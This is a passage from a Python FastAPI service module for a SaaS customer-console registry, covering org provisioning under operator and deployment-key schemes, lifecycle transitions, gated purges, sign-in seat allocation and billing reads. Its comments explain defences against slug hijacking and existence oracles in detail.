    **One endpoint, two schemes, and the CREDENTIAL says which deployment**
    (WS-31 CP-2c slice 1, D46.6 item 1 as amended). A second endpoint was
    refused for root ``CLAUDE.md`` §5's reason — it would be a second way to do
    an existing thing — which is the same call ``POST /registry/resolve`` made.

      * **Operator** — a staff act on a **named** box. The credential is
        cross-org and carries no deployment identity, so ``deployment_label``
        is required and its absence is a **400**.
      * **Deployment key** (capability ``provision``) — a box provisioning a
        customer onto **itself**. The deployment is ``caller.deployment_id``
        and the body may not name one: presenting ``deployment_label`` is a
        **400, never ignored** (R11, the same rule the resolve arm applies to
        ``org_slug``).

    **Nothing infers the deployment in either arm.** A ``count(deployment) = 1``
    fallback is forbidden by name (D46.6 item 3).

    Two refusals beyond that, and they are different questions:

    * **404** — no deployment carries that label. Operator arm only: a key's
      deployment is a foreign key, so it cannot fail to exist. Naming the label
      back is the operator idiom :func:`_org_id` already ships: this credential
      is cross-org by design, so telling it what it asked about is not an
      existence oracle (``customer_console.md`` CP-9 clause 7 — "the contrast,
      not the precedent").
    * **409** — the organization is already placed on a *different*
      deployment. Provisioning never MOVES a placement (D46.6 item 4); a move
      is a separate operator act with its own semantics and its own ticket.
      **Both arms**, and it matters more under the key: the caller there is a
      box rather than a human who might notice a 200 that changed nothing.

    Re-running against the SAME deployment is a no-op on the placement row —
    ``moved_at`` is untouched — exactly like every other step here.

    **The deployment-key arm CREATES an org, it never JOINS one** (WS-31 CP-2c
    slice 1 repair, R11). ``ensure_organization`` is idempotent on the slug, so
    a slug that already exists returns the existing org — and the operator arm's
    idempotent re-provision (cross-org staff, by design) is fine there. The
    deployment-key arm is not: driven in slice 2 by a USER-supplied slug from an
    unauthenticated signup form, an unchecked re-provision would write the
    request's ``owner_email`` an ``owner`` membership and a seat in *someone
    else's* org. So under the key, an existing org already owned by a DIFFERENT
    identity is refused, and — with the placed-elsewhere case — collapses to one
    **409 "slug unavailable"** that names nothing (no placement, no owner, no
    deployment, no "taken here" vs "taken elsewhere"): the old 409/200 split was
    a hijack AND an existence oracle over the global slug namespace. The
    idempotent same-owner retry and the crash-before-membership resume (org with
    NO owner yet) both still complete, because the guard keys on *owned by
    someone else*, not on *exists*.
    """
    with get_engine().begin() as conn:
        # Resolved FIRST, before anything is written: a refusal discovered
        # after five inserts is a rollback whose reason nobody can read in the
        # log. Which arm resolves it is the credential's answer, never the
        # body's.
        if caller is None:
            if req.deployment_label is None:
                # Refused HERE rather than by the model. `deployment_label`
                # became optional so the deployment-key arm could refuse it;
                # without this line that relaxation would silently make the
                # operator's own subject optional — and it would do it by
                # opening the one code path in which a sole-deployment guess
                # could be consulted.
                raise HTTPException(
                    status_code=400,
                    detail=(
                        "deployment_label is required under the operator "
                        "scheme"
                    ),
                )
            deployment_id = store.deployment_by_label(
                conn, label=req.deployment_label
            )
            if deployment_id is None:
                raise HTTPException(
                    status_code=404,
                    detail=f"no deployment {req.deployment_label!r}",
                )
        else:
            if req.deployment_label is not None:
                # 400, never ignored — and refused on SHAPE, before the value
                # is looked at, so naming its own box and naming one that does
                # not exist are the same refusal. Consulting the value first
                # would make the status code answer "does this deployment
                # exist" for every label a caller cares to try.
                raise HTTPException(
                    status_code=400,
                    detail=(
                        "a deployment key may not name a deployment; the "
                        "deployment is the credential's own"
                    ),
                )
            deployment_id = caller.deployment_id

        org_id = store.ensure_organization(
            conn, slug=req.slug, name=req.name,
            gstin=req.gstin, billing_state=req.billing_state,
        )

        # Placement lands before seats and membership: where an organization
        # lives is the most fundamental fact about it, and an org that has
        # seats but no placement is the shape this slice exists to remove.
        placed_on = store.current_placement(conn, org_id=org_id)
        placed_elsewhere = placed_on is not None and placed_on != deployment_id

        if caller is None:
            # ── Operator arm — UNCHANGED from slice 4. ──────────────────────
            # Cross-org staff BY DESIGN, so it names the target back in the
            # operator's own vocabulary. Provisioning never MOVES a placement;
            # a move is a separate operator act with its own ticket (D46.6
            # item 4). The operator is a human who might otherwise believe a
            # 200 moved a customer, so the refusal is explicit and legible.
            if placed_elsewhere:
                raise HTTPException(
                    status_code=409,
                    detail=(
                        f"{req.slug!r} is already placed on another "
                        f"deployment; provisioning never moves a placement — "
                        f"moving it to {req.deployment_label!r} is a separate "
                        f"operator act (saas_multitenancy.md §11 MT-1j "
                        f"slice 4)"
                    ),
                )
        else:
            # ── Deployment-key arm — it CREATES an org, it never JOINS one. ──
            # Two causes, ONE refusal that reveals NOTHING an oracle could read:
            #   * the slug is placed on ANOTHER box (never move — inherited); or
            #   * the slug already has an owner who is not this request's
            #     `owner_email` (R11 — a per-box `provision` key is driven in
            #     slice 2 by a USER-supplied slug from an unauthenticated signup
            #     form, so making its caller a co-owner of a stranger's org must
            #     be refused at THIS door, not the gateway).
            # Both collapse to a bare 409 "slug unavailable": no placement, no
            # owner, no deployment id, no label, no distinction between "taken
            # here" / "taken elsewhere" / "owned by someone else". The old split
            # (409 naming the box when placed elsewhere, a 200 that JOINED
            # otherwise) was BOTH a hijack and an existence oracle over the
            # GLOBAL slug namespace — the exact thing `customer_console.md` §5
            # forbids ("never the existence of an organization this deployment
            # does not serve"). Refused BEFORE any write (placement, membership,
            # seat, audit), so the transaction rolls back having committed
            # nothing.
            #
            # ⚠️ Agent-proposed default (D16/D17 class), recorded for owner
            # ratification in `customer_console.md` CP-2c slice 1. Residual,
            # flagged honestly there: slug AVAILABILITY stays observable at any
            # signup-provision door because global-unique-slug is a hard
            # constraint a form must report — this narrows the oracle to "slug
            # taken: yes/no" and removes the placement/ownership discrimination;
            # the residual is inherent, not closed here. The no-owner-yet resume
            # case (org created, crash before membership) is NOT a conflict, so
            # the same `owner_email` may complete it.
            if placed_elsewhere or store.org_owned_by_other(
                conn, org_id=org_id, owner_email=req.owner_email
            ):
                raise HTTPException(
                    status_code=409, detail="slug unavailable"
                )
        store.place_organization(
            conn, org_id=org_id, deployment_id=deployment_id
        )

        identity_id = store.ensure_identity(conn, email=req.owner_email)

        # Only grant on FIRST provision — a retry must not keep buying seats.
        grants, _assigned = store.seat_rows(
            conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG
        )
        if not grants:
            store.grant_seats(
                conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG,
                quantity=req.core_seats, reason="provision",
            )

        conn.execute(
            text(
                """
                INSERT INTO org_membership
                    (organization_id, user_identity_id, role, status, joined_at)
                VALUES (:org, :identity, 'owner', 'active', now())
                ON CONFLICT (organization_id, user_identity_id) DO NOTHING
                """
            ),
            {"org": org_id, "identity": identity_id},
        )
        store.try_assign_seat(
            conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG,
            identity_id=identity_id, source="core",
        )
        # The trial subscription. Without this row an org has seats and no
        # commercial state at all, and every billing surface has to invent a
        # default — which is how two surfaces come to disagree about whether a
        # customer is in trial.
        conn.execute(
            text(
                """
                INSERT INTO org_subscription (organization_id, status,
                                              trial_ends_at)
                VALUES (:org, 'trial', now() + interval '14 days')
                ON CONFLICT (organization_id) DO NOTHING
                """
            ),
            {"org": org_id},
        )

        # Resumability, recorded rather than assumed. Provisioning is a
        # multi-step distributed action that WILL fail halfway; this row is what
        # lets a re-run tell "already done" from "never started" instead of
        # guessing from whichever side effect it happens to find first.
        conn.execute(
            text(
                """
                INSERT INTO provisioning_run
                    (idempotency_key, organization_id, steps_done, status)
                VALUES (:key, :org,
                        ARRAY['org','placement','identity','seats',
                              'membership','subscription'],
                        'complete')
                ON CONFLICT (idempotency_key) DO UPDATE
                    SET organization_id = EXCLUDED.organization_id,
                        steps_done = EXCLUDED.steps_done,
                        status = 'complete',
                        updated_at = now()
                """
            ),
            {"key": f"provision:{req.slug}", "org": org_id},
        )
        # ⚠️ The ACTOR distinguishes the two arms, and it is not decoration:
        # `_audit`'s own contract is that a trail calling every act "operator"
        # *"would misattribute the one class of write we most need to tell
        # apart later"*. A box provisioning a self-serve customer is exactly
        # that class — the one provisioning act with no human in it — and
        # recording it as staff would make the self-serve flow indistinguishable
        # from an operator's console session forever after.
        #
        # The deployment is recorded by ID in both arms — the operator's label
        # is a name for it, and a name can be re-pointed at a different row —
        # with the operator's own word kept beside it, and the key's PREFIX
        # (never its secret) so the trail names WHICH credential acted.
        # `owner_email` is recorded so the trail names WHO was made owner: a
        # deployment-key create and a hijack attempt are the same act shape
        # (`org.provision` under `actor="deployment"`), and only the owner
        # written tells a real self-serve create from an attempt to co-own a
        # stranger's org (the ownership guard above refuses the latter before it
        # can be audited, but the field is what makes the legitimate writes
        # legible — who owns what, by which credential).
        detail: dict[str, Any] = {
            "slug": req.slug,
            "owner_email": req.owner_email,
            "deployment": req.deployment_label,
            "deployment_id": deployment_id,
        }
        if caller is not None:
            detail["key_prefix"] = caller.key_prefix
        _audit(conn, org_id, "org.provision", detail,
               actor="operator" if caller is None else "deployment")

    return {"organization_id": org_id, "slug": req.slug}


@app.post("/orgs/lifecycle")
def set_lifecycle(req: LifecycleRequest, _: Operator) -> dict[str, Any]:
    """Move an organization through the lifecycle. Transitions only, never sets.

    A free-form status write would let an operator move a customer straight from
    `past_due` to `deleted`, destroying their data without the export window
    §2.1 requires. The graph in :mod:`customer_console.lifecycle` makes that
    unreachable rather than merely discouraged.
    """
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        current = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()

        try:
            assert_transition(current, req.target)
        except TransitionRefused as exc:
            raise HTTPException(status_code=409, detail=str(exc))

        # Entering `cancelled` opens the export window. Recorded as a date on
        # the row, so "how long do they have" is answerable by anyone rather
        # than living in whoever ran the cancellation's memory.
        export_until = (
            f"now() + interval '{int(req.export_window_days)} days'"
            if req.target == "cancelled" else "NULL"
        )
        conn.execute(
            text(
                f"UPDATE organization SET status = :s, updated_at = now(), "
                f"       export_until = {export_until} "
                f"WHERE id = :i"
            ),
            {"s": req.target, "i": org_id},
        )
        conn.execute(
            text("UPDATE org_subscription SET status = :s, updated_at = now() "
                 "WHERE organization_id = :i AND :s <> 'deleted'"),
            {"s": req.target, "i": org_id},
        )
        _audit(conn, org_id, "org.lifecycle",
               {"from": current, "to": req.target, "reason": req.reason})

        caps = capabilities_of(req.target)

    return {
        "slug": req.org_slug, "from": current, "to": req.target,
        "can_sign_in": caps.can_sign_in, "can_use_ai": caps.can_use_ai,
        "can_write_seats": caps.can_write_seats,
        "data_retained": caps.data_retained,
    }


#: What `/orgs/purge` deletes vs keeps, module-level so the receipt and the
#: suite pin the SAME list (the N8 `_PURGE_DELETES`/`_PURGE_KEEPS` idiom).
#: Deleted = personal data (emails, identity links) and live secrets. Kept =
#: the financial record — a purge is entitled to take the people, never the
#: books. Child-before-parent where it matters (`seat_assignment` and
#: `member_ai_cap` reference `user_identity` rows that stay).
_ORG_PURGE_DELETES: tuple[str, ...] = (
    "seat_assignment",
    "member_ai_cap",
    "org_membership",
    "llm_api_key",
    "provider_credential",
    "org_placement",
)
_ORG_PURGE_KEEPS: tuple[str, ...] = (
    "organization (tombstone row, slug renamed)",
    "org_subscription",
    "seat_grant",
    "credit_ledger",
    "payment_order",
    "usage_event",
    "usage_rollup",
    "control_audit",
)


@app.post("/orgs/purge")
def purge_org_registry(req: OrgPurgeRequest, _: Operator) -> dict[str, Any]:
    """CP-2g — the registry half of destroying an organization.

    Reachable ONLY in `deleted` — the lifecycle graph's terminal state, which
    itself is reachable only from `cancelled`, i.e. only after the export
    window. So the doctrine ("never destroy customer data without an export
    window") holds by construction across all three acts: cancel → delete →
    purge. This door strips personal data and live secrets, then RENAMES the
    slug to a tombstone so the name is free for a fresh start; the registry
    row and the financial ledger stay, because an organization having existed
    and paid is a fact the books must keep.

    The tenant plane is NOT touched here — the Console cannot reach the tenant
    database by design. The operator BFF pairs this with the gateway's
    `DELETE /internal/operator/organizations/{slug}` (the other half), and
    both halves are idempotent so a half-failed pair is just re-run.
    """
    if req.confirm != req.org_slug:
        raise HTTPException(
            status_code=400,
            detail="confirm must equal org_slug, verbatim",
        )
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        status = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()
        if status != "deleted":
            raise HTTPException(
                status_code=409,
                detail=(
                    f"organization is {status!r}; purge is reachable only in "
                    "'deleted'. The path is: cancel access (opens the export "
                    "window), then mark deleted, then purge."
                ),
            )
        deleted: dict[str, int] = {}
        for table in _ORG_PURGE_DELETES:
            deleted[table] = conn.execute(
                text(f"DELETE FROM {table} WHERE organization_id = :i"),
                {"i": org_id},
            ).rowcount
        tombstone = f"{req.org_slug}-purged-{uuid.uuid4().hex[:6]}"
        conn.execute(
            text(
                "UPDATE organization SET slug = :t, updated_at = now() "
                "WHERE id = :i"
            ),
            {"t": tombstone, "i": org_id},
        )
        _audit(conn, org_id, "org.purge",
               {"slug": req.org_slug, "tombstone": tombstone,
                "deleted": deleted})
    return {
        "slug": req.org_slug,
        "tombstone": tombstone,
        "deleted": deleted,
        "kept": list(_ORG_PURGE_KEEPS),
    }


@app.post("/registry/resolve")
def resolve(req: ResolveRequest, caller: ResolveCaller) -> dict[str, Any]:
    """Resolve a person against the registry at sign-in, consuming a Core seat.

    **This is what makes the seat cap real.** A person cannot become a user of
    an organization without the Customer Console allocating them a seat, because
    the deployment asks before admitting them (D32.4/D32.5).

    **One endpoint, two schemes, two response shapes chosen by the credential**
    (CP-2b clauses 3 and 12). A second endpoint was refused for root
    ``CLAUDE.md`` §5's reason: it would be a second way to do an existing thing.

      * **Operator** — a staff act on a **named** customer. Unchanged, down to
        the response keys; the operator credential has no tenant of its own, so
        naming one in the body is not R11's violation, it is the act itself.
      * **Deployment key** — a box asking about a person it has just
        authenticated. It names **no** org: the org is the ANSWER, not the
        assertion, which is R11 at its strongest available reading — the caller
        makes no tenant claim at all.

    Returns 409 with a buy-more payload when the organization is full — never an
    auto-upgrade, and never a silent admit.
    """
    if caller is not None:
        return _resolve_for_deployment(req, caller)
    return _resolve_for_operator(req)


def _resolve_for_operator(req: ResolveRequest) -> dict[str, Any]:
    """The shipped operator shape, unchanged (CP-2b clause 3's regression)."""
    if req.org_slug is None:
        # Refused HERE rather than by the model. `org_slug` became optional so
        # the deployment arm could refuse it; without this line that relaxation
        # would silently make the operator's own subject optional, and an
        # operator call with no org named is a request with no target.
        raise HTTPException(
            status_code=400,
            detail="org_slug is required under the operator scheme",
        )

    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug)
        state = conn.execute(
            text("SELECT status FROM organization WHERE id = :i"), {"i": org_id}
        ).scalar_one()
        caps = capabilities_of(state)
        if not caps.can_sign_in:
            # Only `deleted` lands here. `suspended` and `cancelled` sign in
            # deliberately: a customer who cannot log in cannot pay you, cannot
            # update a card and cannot export.
            raise HTTPException(
                status_code=403, detail=f"organization is {state}")

        identity_id = store.ensure_identity(
            conn, email=req.email, display_name=req.display_name
        )

        # The SAME allocation path the deployment arm takes — one
        # implementation of "may this person have a Core seat", so the two
        # schemes cannot drift on the answer that costs money. It also carries
        # the advisory lock that makes the cap hold under concurrency.
        #
        # ⚠️ `seats_locked=False` unconditionally, and that is a **recorded
        # pre-existing gap, not a choice made here**: the shipped operator arm
        # allocates seats to a `suspended` organization, which
        # `POST /billing/seats` refuses with 403 (`capabilities_of(state).
        # can_write_seats`). Its current behaviour is pinned by
        # `test_customer_console_lifecycle.py:170` and changing it is a
        # behaviour change to a shipped surface, so CP-2b records it in the
        # spec rather than smuggling it into a refactor. The deployment arm
        # passes the real answer.
        _allocate_core_seat(
            conn, org_id=org_id, identity_id=identity_id, seats_locked=False,
        )

        role = conn.execute(
            text(
                "SELECT role, status FROM org_membership "
                "WHERE organization_id = :org AND user_identity_id = :i"
            ),
            {"org": org_id, "i": identity_id},
        ).first()
        seats = [
            r[0] for r in conn.execute(
                text(
                    "SELECT plan_slug FROM seat_assignment "
                    "WHERE organization_id = :org AND user_identity_id = :i "
                    "AND released_at IS NULL"
                ),
                {"org": org_id, "i": identity_id},
            )
        ]

    return {
        "identity_id": identity_id,
        "organization_id": org_id,
        "role": role[0] if role else "member",
        "status": role[1] if role else "active",
        "seats": seats,
    }


#: The seat outcome vocabulary of the deployment answer (CP-2b clause 12).
#: Three words, named once: a caller branches on them, and a fourth invented at
#: a call site would be a vocabulary nobody agreed to.
_SEAT_ALLOCATED = "allocated"
_SEAT_ALREADY_HELD = "already_held"
_SEAT_NOT_ALLOCATED = "not_allocated"


def _resolve_for_deployment(
    req: ResolveRequest, caller: DeploymentCaller
) -> dict[str, Any]:
    """A box asking about a person it has just authenticated (CP-2b).

    What this answer may carry is bounded to what sign-in needs: org id, slug,
    placement target, lifecycle status, and the seat outcome for the presented
    email. **Never a balance, never a credit figure, never an invoice, and
    never a `role`** — ``org_membership.role`` is registry/billing vocabulary,
    the tenant's permission vocabulary is ``org_role`` plus the ladder
    ``acb_auth/access.py`` resolves, and a second grant vocabulary is forbidden
    by name (D12, root ``CLAUDE.md`` §5).
    """
    if req.org_slug is not None:
        # 400, never ignored. An ignored field is a caller who believes it
        # worked — and what it believes worked here is naming its own tenant.
        raise HTTPException(
            status_code=400,
            detail=(
                "a deployment key may not name an organization; the org is "
                "derived from membership and placement"
            ),
        )

    with get_engine().begin() as conn:
        visible = store.deployment_visible_orgs(
            conn, deployment_id=caller.deployment_id, email=req.email
        )

        # Partitioned by the ONE state machine, never by a local frozenset of
        # state names: `deleted` is the only state with can_sign_in=False, and
        # `suspended`/`cancelled` stay open deliberately (a customer who cannot
        # log in cannot pay you, and `cancelled` IS the export window).
        admissible = [
            o for o in visible if capabilities_of(o["status"]).can_sign_in
        ]
        refused = [
            o for o in visible if not capabilities_of(o["status"]).can_sign_in
        ]

        if not admissible:
            if refused:
                # Named, not hidden. This deployment already serves that
                # customer, so the state reveals nothing it does not have —
                # and it needs the state to refuse correctly. Same shape the
                # operator arm has always returned.
                raise HTTPException(
                    status_code=403,
                    detail=f"organization is {refused[0]['status']}",
                )
            # The three invisible cases — no membership anywhere, membership
            # only on another deployment, no such organization — are ONE
            # answer, byte for byte. A distinguishable negative IS a cross-org
            # existence oracle (clause 5, CP-3's `recorded:false` lesson).
            # In particular: no `identity_id`, which would otherwise say
            # whether this email is known to the Console at all.
            return {"organizations": []}

        identity_id = store.ensure_identity(
            conn, email=req.email, display_name=req.display_name
        )

        seat_outcomes: dict[str, str] = {}
        if len(admissible) == 1:
            org = admissible[0]

            # ── D50.3 · first sign-in activates an INVITED member ───────────
            # CP-2f's registry half. A colleague added through CP-2f's door sits
            # at `invited` until they actually turn up; this is the turning up.
            # It runs before the seat allocation, and the ORDER is cosmetic
            # rather than semantic: both writes share this one transaction, so a
            # seat-cap 409 (`_allocate_core_seat` raising) UNWINDS the promotion
            # with it — measured on real PG (review round 1, finding 3): a
            # colleague refused a seat stays `invited` and no seat is burned.
            # That is the desirable behaviour — a person who cannot yet get in
            # keeps the state the invite gave them — and it is now fenced
            # (`test_a_cap_409_rolls_the_promotion_back`).
            #
            # ⚠️ **The guard lives in the UPDATE's own WHERE**
            # (`store.activate_invited_member`), not here. `suspended`,
            # `removed` and already-`active` rows are untouched by construction
            # — the natural implementation ("anything that is not active →
            # activate") silently un-suspends people, which
            # `colleague_onboarding.md` §6 predicted in as many words before
            # this existed. Refusal of a suspended ORGANIZATION is unaffected:
            # that partition happened above, on `can_sign_in`.
            #
            # ⚠️ **Single-admissible-org branch ONLY.** The multi-org branch
            # below deliberately allocates nothing (clause 9) and its resolve is
            # REFUSED upstream with `WorkspaceChooserRequired`, so activating
            # there would mark a membership active for a sign-in that never
            # completed. The OPERATOR arm does not do this either: a staff query
            # about a named customer must not activate anybody.
            store.activate_invited_member(
                conn, org_id=org["organization_id"], identity_id=identity_id
            )

            seat_outcomes[org["organization_id"]] = _allocate_core_seat(
                conn, org_id=org["organization_id"], identity_id=identity_id,
                # The lifecycle decides whether a seat may be WRITTEN, and it
                # is a different question from whether this person may sign in
                # — the state machine answers both, and this arm asks both.
                seats_locked=not capabilities_of(org["status"]).can_write_seats,
            )
        else:
            # More than one visible organization → allocate NOTHING. Allocating
            # a seat in every organization a person can see would bill an admin
            # for a login they did not make (clause 9). Choosing among them is
            # the chooser, which is a named non-goal.
            #
            # ⚠️ Allocating nothing is not the same as holding nothing. The
            # seat token answers *does this person hold a seat here*, never
            # *did this call allocate one* — a caller reading `not_allocated`
            # for an org where the person already sits would conclude they are
            # unseated and go buy a seat they already own.
            for org in admissible:
                seat_outcomes[org["organization_id"]] = (
                    _SEAT_ALREADY_HELD
                    if store.has_live_seat(
                        conn, org_id=org["organization_id"],
                        plan_slug=CORE_PLAN_SLUG, identity_id=identity_id,
                    )
                    else _SEAT_NOT_ALLOCATED
                )

        return {
            "identity_id": identity_id,
            "organizations": [
                {
                    "organization_id": o["organization_id"],
                    "slug": o["slug"],
                    "placement": o["placement"],
                    "status": o["status"],
                    "seat": seat_outcomes[o["organization_id"]],
                    "capabilities": _capability_block(o["status"]),
                }
                for o in admissible
            ],
        }


def _capability_block(status: str) -> dict[str, bool]:
    """The three booleans the DEPLOYMENT stores and applies (CP-2b §6(d)).

    **Computed here, where the state machine is, because the deployment must
    not import it.** ``capabilities_of`` lives in this package; a tenant box
    that depended on it would ship the Console's code, and a tenant box that
    re-implemented it would be a second copy of the state machine spelled as an
    ``if``. So the decision is made on this side and only its RESULT crosses
    the wire. A deployment that branches on ``sign_in`` cannot drift, because
    there is nothing to drift from. Fenced from the other side by
    ``tests/unit/test_console_dependency_boundary.py``.

    ⚠️ **In a 200 body ``sign_in`` is ALWAYS true**, and that is a property of
    the caller, not of this function: ``_resolve_for_deployment`` partitions on
    ``can_sign_in`` above, 403s when nothing is admissible, and builds the
    array from ``admissible`` alone. It rides the wire anyway — it is the box's
    durable record and MT-2's future input, and a field that is constant
    *today* because of a filter *upstream* is exactly the field to send
    explicitly rather than leave the reader to infer.

    Three names, not ``OrgCapabilities``' **five**: ``data_retained`` is a
    Console-side retention fact with no deployment behaviour behind it, and
    ``can_pay`` (CP-9) is a *Console-side door*, not a tenant one — a
    deployment has nothing to decide with either, and shipping a field nothing
    reads invites somebody to read it. *(Said "four" until CP-9 appended the
    fifth boolean; a count in a comment goes stale silently, which is why the
    dataclass is the authority and this sentence merely points at it.)*

    Added to the DEPLOYMENT arm only — adding it to the operator arm would
    change a shipped surface for no caller (clause 12).
    """
    caps = capabilities_of(status)
    return {
        "sign_in": caps.can_sign_in,
        "write_seats": caps.can_write_seats,
        "use_ai": caps.can_use_ai,
    }


def _allocate_core_seat(
    conn, *, org_id: str, identity_id: str, seats_locked: bool
) -> str:
    """Consume a Core seat for one person, idempotently. Raises 409 at the cap.

    **The one seat-allocation path both arms of resolve go through** — not two
    copies of the same four calls. Four surfaces recomputing "how many seats
    are free" is how they come to disagree, and the one that disagrees in the
    customer's favour is the one that costs money (``seats.py`` module note).

    Args:
        seats_locked: the organization's lifecycle forbids seat WRITES
            (``capabilities_of(state).can_write_seats`` is False, i.e.
            ``suspended`` or ``cancelled``). Deliberately a **required**
            keyword rather than a default: every caller has to state which
            answer it is choosing, because the version of this function that
            defaulted it to False is the version that allocated new seats to a
            suspended customer on every sign-in.

    Note what ``seats_locked`` does **not** do: it is not sign-in admission.
    ``suspended`` and ``cancelled`` keep ``can_sign_in`` True on purpose (a
    customer who cannot log in cannot pay you, and ``cancelled`` IS the export
    window) while ``can_write_seats`` goes False. So the door stays open, the
    person is told the truth about their seat, and **nothing is written**.
    """
    if seats_locked:
        # Report, never write. A member who already holds a seat keeps it —
        # suspension locks the seat WRITER, it does not repossess seats — and
        # a member who holds none is simply not given one, rather than being
        # refused a login they are entitled to.
        held = store.has_live_seat(
            conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG,
            identity_id=identity_id,
        )
        return _SEAT_ALREADY_HELD if held else _SEAT_NOT_ALLOCATED

    # BEFORE the count, not between the count and the insert — see the
    # function's own note in `store.lock_seat_capacity`. Everything from here
    # to the INSERT is one serialised critical section per (org, plan).
    store.lock_seat_capacity(conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG)

    held = store.has_live_seat(
        conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG, identity_id=identity_id
    )
    grants, assigned = store.seat_rows(
        conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG
    )
    decision = decide_assignment(
        seat_counts(CORE_PLAN_SLUG, grants, assigned),
        already_assigned=held,
        price_inr=store.plan_price(conn, plan_slug=CORE_PLAN_SLUG),
    )
    if not decision.allowed:
        # Byte-compatible with the shipped seats path, because a caller that
        # learned the payload from one scheme must not have to relearn it.
        raise HTTPException(
            status_code=decision.status,
            detail={"reason": decision.reason, "buy_more": decision.buy_more},
        )

    if held:
        return _SEAT_ALREADY_HELD
    store.try_assign_seat(
        conn, org_id=org_id, plan_slug=CORE_PLAN_SLUG,
        identity_id=identity_id, source="core",
    )
    return _SEAT_ALLOCATED


@app.get("/billing/summary")
def billing_summary(org_slug: str, _: Operator) -> dict[str, Any]:
    """Seats, credits and the member roster for one organization.

    The Operator Console's per-org detail read, to ``GET /orgs``'s cross-org
    list.

    **``members`` (D49 / ``launch_surface.md`` LS-9).** The operator console can
    already assign and release a customer's seats by email; what it could not do
    was SEE whom to act on — the same gap ``GET /me/members`` had one door down,
    and the reason an operator had to be told an address rather than pick one.
    The roster carries each member's live seat slugs, so *Unassigned* is as
    visible to us as it is to the customer's own admin.

    It is the SAME pair of store reads the customer-facing roster uses
    (``org_members`` + ``live_seats_by_email``), in the same transaction as the
    seat grid, so an operator and a customer admin looking at the same
    organization cannot be shown different answers. Two queries for any roster
    size, never one per member.

    The seat COUNTS remain ``_seat_grid`` → ``seat_counts``'s, the one seat
    vocabulary (§3.3, D32.5) — this route surfaces membership facts beside them,
    it does not compute a second set.
    """
    with get_engine().begin() as conn:
        org_id = _org_id(conn, org_slug)
        seats = _seat_grid(conn, org_id)
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))
        roster = store.org_members(conn, org_id=org_id)
        held = store.live_seats_by_email(conn, org_id=org_id)

    return {
        "organization_id": org_id,
        "seats": seats,
        "credit_balance": str(balance),
        "members": [
            {**row, "seats": held.get(row["email"], [])} for row in roster
        ],
    }


@app.get("/orgs")
def list_organizations(_: Operator) -> OrgListView:
    """Every organization, with plan/MRR, seats, credits, status and trial
    expiry — the Operator Console's customer list (§4.1a, CP-8).

    The cross-org *list* to ``GET /billing/summary``'s per-org *detail*, and the
    read CP-8's separate app renders its customer table from. ``Operator``-only
    and cross-tenant BY DESIGN: this is THE read that spans organizations
    (``saas_multitenancy.md`` §0.9.2), and no customer credential can reach it —
    ``store.cross_org_summary`` carries no ``organization_id`` filter because its
    whole job is to answer "which customers exist and how are they doing", the
    question no single tenant deployment can answer.

    **Every number is surfaced, never recomputed.** The seat grid is
    :func:`seat_counts` over the rows the store fetched — byte-identical to
    ``billing_summary``'s, the ONE seat vocabulary (§3.3, D32.5) — and MRR is the
    ONE money conversion ``payments.paise`` (§9.2) applied to the recurring value
    of *purchased* seats. MRR is **zero unless the subscription is active**: a
    trial is not revenue yet and a suspended/cancelled org is churned, so a book
    that counted them would overstate. That gate is an agent-proposed default the
    owner may overrule (D16/D17); the lifecycle and subscription statuses are
    both on the wire so an operator sees the real state, not an inferred one.

    ⚠️ Ships DARK: the Console deploys nowhere yet and the operator token is
    OWNER-GATE (§8). This is the route existing, not running.
    """
    with get_engine().begin() as conn:
        rows = store.cross_org_summary(conn)

    organizations: list[OrgSummaryView] = []
    for r in rows:
        seats: list[SeatPlanView] = []
        mrr_inr = Decimal(0)
        for line in r["seats"]:
            counts = seat_counts(line["plan_slug"], line["grants"],
                                 line["assigned"])
            seats.append(SeatPlanView(
                plan_slug=counts.plan_slug,
                purchased=counts.purchased,
                assigned=counts.assigned,
                available=counts.available,
                oversubscribed=counts.oversubscribed,
            ))
            mrr_inr += counts.purchased * line["price_inr"]

        active = r["subscription_status"] == "active"
        organizations.append(OrgSummaryView(
            slug=r["slug"],
            name=r["name"],
            status=r["status"],
            subscription_status=r["subscription_status"],
            provider=r["provider"],
            trial_ends_at=_iso(r["trial_ends_at"]),
            current_period_end=_iso(r["current_period_end"]),
            export_until=_iso(r["export_until"]),
            credit_balance=str(r["credit_balance"]),
            mrr_paise=payments.paise(mrr_inr) if active else 0,
            seats=seats,
        ))

    return OrgListView(organizations=organizations)


@app.post("/billing/subscriptions/activate")
def activate_subscription_manual(
    req: ManualActivationRequest, _: Operator
) -> dict[str, Any]:
    """MANUAL / bank-transfer activation — the offline twin of ``payments.fulfil``
    (§6 item (j)).

    Platform staff activate a PAID plan for a customer that paid OUT OF BAND,
    with **no Razorpay order**. It composes ``fulfil``'s grant, minus the order,
    through the SAME store seams — no new seam:

    * ``store.activate_subscription`` with ``provider='manual'`` and NULL provider
      ids: ``org_subscription`` goes ``status='active'`` with a real period, the
      value ``001_customer_console.sql:163``'s ``CHECK`` pre-provisioned and
      nothing wrote until now. Never ``'none'`` — that belongs to
      ``payment_order.provider``, not here (``store.activate_subscription``).
    * ``store.grant_seats`` for the plan's PAID seats (``reason='manual'``).
    * ``store.add_credit`` when the request carries AI credits, under
      :data:`credits.LEDGER_REASON_MANUAL` with the bank reference as ``ref``.

    It does **not** touch ``organization.status`` — like ``fulfil``, a suspended
    org that pays holds an active paid term and stays suspended until an operator
    posts the transition (done-when 16). Only ``org_subscription`` moves here.

    **Idempotency / the double-grant guard.** Activating grants PAID capacity, and
    ``grant_seats``/``add_credit`` are append-only INSERTs — a second call would
    grant twice (``activate_subscription`` upserts and is harmless alone; the
    seats and credits are not). So an org already holding an **active**
    subscription is refused **409**: an operator adjusts a live term through the
    seat and credit routes, never by re-activating it. A ``trial`` (or any
